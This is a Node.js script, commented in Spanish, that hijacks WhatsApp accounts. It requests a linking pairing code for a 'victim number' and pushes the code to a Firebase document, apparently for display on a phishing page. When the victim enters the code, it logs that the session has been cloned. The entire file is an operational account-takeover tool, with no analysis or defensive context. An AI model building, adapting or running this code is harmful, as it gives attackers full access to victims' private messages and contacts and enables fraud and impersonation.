const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// CONFIGURACIÓN FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// CONFIGURACIÓN PUPPETEER PARA RENDER
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// Función para generar el código de 8 dígitos
async function generarCodigo(snap) {
    const data = snap.data();
    if (data && data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("Solicitando codigo para: " + data.numero_victima);
        try {
            // Pedimos el código a WhatsApp
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("CODIGO GENERADO EXITOSAMENTE: " + code);
            
            // Lo subimos a Firebase
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log("Error al generar codigo: " + err.message);
        }
    }
}

// Escuchamos cambios en Firebase
db.collection("wa_clon_global").doc("current_session").onSnapshot(generarCodigo);

client.on('ready', () => {
    console.log("WHATSAPP CONECTADO - SESIÓN CLONADA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Error de inicio:", e));

// Servidor para que Render mantenga el servicio activo
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.write('MOTOR PAIRING ACTIVO');
    res.end();
}).listen(port, () => {
    console.log("Servidor escuchando en puerto " + port);
});
